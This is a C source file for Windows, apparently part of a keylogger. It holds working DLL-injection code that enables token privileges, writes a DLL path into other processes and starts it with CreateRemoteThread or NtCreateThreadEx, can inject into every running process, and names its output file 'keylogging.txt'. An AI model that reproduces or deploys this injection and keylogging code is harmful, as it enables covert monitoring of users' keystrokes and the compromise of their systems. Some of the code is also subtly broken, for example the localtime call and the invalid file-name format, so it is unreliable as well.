#include "header.h"

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken))
	{
		printf("OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
	HANDLE                  hProcess, hThread;
	LPVOID                  pRemoteBuf;
	DWORD                   dwBufSize = lstrlen(szDllPath) + 1;
	LPTHREAD_START_ROUTINE  pThreadProc;

	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
	{
		printf("OpenProcess(%d) failed!!!\n", dwPID);
		return FALSE;
	}

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,
		MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pRemoteBuf,
		(LPVOID)szDllPath, dwBufSize, NULL);

	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
#if defined(_WIN64)
	FARPROC     pFunc = NULL;
	pFunc = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	if (pFunc == NULL)
	{
		printf(" GetProcAddress(\"NtCreateThreadEx\") failed!!! [%d]\n",
			GetLastError());
		return FALSE;
	}
	((PFNTCREATETHREADEX)pFunc)(&hThread,
		0x1FFFFF,
		NULL,
		hProcess,
		pThreadProc,
		pRemoteBuf,
		FALSE,
		NULL,
		NULL,
		NULL,
		NULL);
#else
	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);
#endif
	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}

BOOL EjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
	BOOL                    bMore = FALSE, bFound = FALSE;
	HANDLE                  hSnapshot, hProcess, hThread;
	MODULEENTRY32           me = { sizeof(me) };
	LPTHREAD_START_ROUTINE  pThreadProc;

	if (INVALID_HANDLE_VALUE ==
		(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))
		return FALSE;

	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me))
	{
		if (!_stricmp(me.szModule, szDllPath) ||
			!_stricmp(me.szExePath, szDllPath))
		{
			bFound = TRUE;
			break;
		}
	}

	if (!bFound)
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}

	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
	{
		printf("OpenProcess(%d) failed!!!\n", dwPID);
		CloseHandle(hSnapshot);
		return FALSE;
	}

	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "FreeLibrary");
#if defined(_WIN64)
	FARPROC     pFunc = NULL;
	pFunc = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	if (pFunc == NULL)
	{
		printf(" GetProcAddress(\"NtCreateThreadEx\") failed!!! [%d]\n",
			GetLastError());
		return FALSE;
	}
	((PFNTCREATETHREADEX)pFunc)(&hThread,
		0x1FFFFF,
		NULL,
		hProcess,
		pThreadProc,
		me.modBaseAddr,
		FALSE,
		NULL,
		NULL,
		NULL,
		NULL);
#else
	hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL);
#endif
	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);

	return TRUE;
}

BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)
{
	DWORD                   dwPID = 0;
	HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32          pe;

	// Get the snapshot of the system
	pe.dwSize = sizeof(PROCESSENTRY32);
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	// find process
	Process32First(hSnapShot, &pe);
	do
	{
		dwPID = pe.th32ProcessID;

		if (dwPID < 100)
			continue;

		if (nMode == INJECTION_MODE)
			InjectDll(dwPID, szDllPath);
		else
			EjectDll(dwPID, szDllPath);
	} while (Process32Next(hSnapShot, &pe));

	CloseHandle(hSnapShot);

	return TRUE;
}

BOOL SearchProcess(int searchType, DWORD pid, const char* pName,DWORD* findProcessPID)
{
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry32;

	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("Can't get snapshot.\n");
		return FALSE;
	}

	processEntry32.dwSize = sizeof(PROCESSENTRY32);

	switch (searchType)
	{
	case BY_PID:
		if (!Process32First(hProcessSnap, &processEntry32))
		{
			printf("Process32First failed.\n");
			CloseHandle(hProcessSnap);
			return FALSE;
		}

		if (pid==processEntry32.th32ProcessID)
		{
			*findProcessPID = processEntry32.th32ProcessID;
			CloseHandle(hProcessSnap);
			return TRUE;
		}

		while (Process32Next(hProcessSnap, &processEntry32))
		{
			if (pid == processEntry32.th32ProcessID)
			{
				*findProcessPID = processEntry32.th32ProcessID;
				CloseHandle(hProcessSnap);
				return TRUE;
			}
		}
		CloseHandle(hProcessSnap);
		return FALSE;
		break;
	case BY_NAME:
		if (!Process32First(hProcessSnap, &processEntry32))
		{
			printf("Process32First failed.\n");
			CloseHandle(hProcessSnap);
			return FALSE;
		}

		if (!strncmp(pName, processEntry32.szExeFile, MAX_PROCESS_NAME_LENGTH))
		{
			*findProcessPID = processEntry32.th32ProcessID;
			CloseHandle(hProcessSnap);
			return TRUE;
		}

		while (Process32Next(hProcessSnap, &processEntry32))
		{
			if (!strncmp(pName, processEntry32.szExeFile, MAX_PROCESS_NAME_LENGTH))
			{
				*findProcessPID = processEntry32.th32ProcessID;
				CloseHandle(hProcessSnap);
				return TRUE;
			}
		}
		CloseHandle(hProcessSnap);
		return FALSE;
		break;
	default:
		printf("Invalid search type.\n");
		return FALSE;
	}
}

BOOL MakeFileName(char* fileName)
{
	time_t timer;
	struct tm* t=NULL;
	char tempFileName[MAX_FILE_LENGTH+1]="";
	timer = time(NULL);

	t = localtime(timer);

	int year = t->tm_year + 1900,
		month = t->tm_mon + 1,
		day = t->tm_mday,
		time = t->tm_hour,
		min = t->tm_min,
		sec = t->tm_sec;

	if (!sprintf(tempFileName, "%d/%d/%d %d:%d:%d keylogging.txt", year, month, day, time, min, sec))
		return FALSE;

	strncpy(fileName, tempFileName, strlen(tempFileName));

	return TRUE;
}